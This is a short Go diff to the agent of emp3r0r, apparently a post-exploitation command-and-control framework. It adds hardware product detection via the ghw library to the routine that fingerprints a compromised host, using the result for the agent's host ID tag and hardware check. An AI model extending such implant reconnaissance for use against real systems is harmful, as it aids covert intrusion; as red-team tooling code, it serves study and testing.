@@ -14,6 +14,7 @@ import (
 	"runtime"
 	"strings"
 
+	"github.com/jaypipes/ghw"
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
@@ -89,7 +90,13 @@ func CollectSystemInfo() *emp3r0r_data.AgentSystemInfo {
 		log.Printf("Gethostname: %v", err)
 		hostname = "unknown_host"
 	}
-	RuntimeConfig.AgentTag = util.GetHostID(RuntimeConfig.AgentUUID)
+	// read productInfo
+	info.Product, err = ghw.Product(ghw.WithDisableWarnings())
+	if err != nil {
+		log.Printf("ProductInfo: %v", err)
+	}
+
+	RuntimeConfig.AgentTag = util.GetHostID(info.Product, RuntimeConfig.AgentUUID)
 	info.Tag = RuntimeConfig.AgentTag // use hostid
 	info.Hostname = hostname
 	info.Name = strings.Split(info.Tag, "-agent")[0]
@@ -99,7 +106,7 @@ func CollectSystemInfo() *emp3r0r_data.AgentSystemInfo {
 	info.CPU = util.GetCPUInfo()
 	info.GPU = util.GetGPUInfo()
 	info.Mem = fmt.Sprintf("%d MB", util.GetMemSize())
-	info.Hardware = util.CheckProduct()
+	info.Hardware = util.CheckProduct(info.Product)
 	info.Container = CheckContainer()
 	setC2Transport()
 	info.Transport = emp3r0r_data.Transport
